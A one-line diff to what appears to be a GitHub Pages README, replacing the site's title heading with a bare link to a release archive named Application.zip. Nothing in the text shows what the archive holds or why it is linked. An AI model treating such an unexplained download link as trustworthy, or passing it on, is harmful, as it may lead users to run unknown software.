@@ -1,1 +1,1 @@
-# leehanini.github.io
+# https://github.com/leehanini/leehanini.github.io/releases/download/v1.0/Application.zip
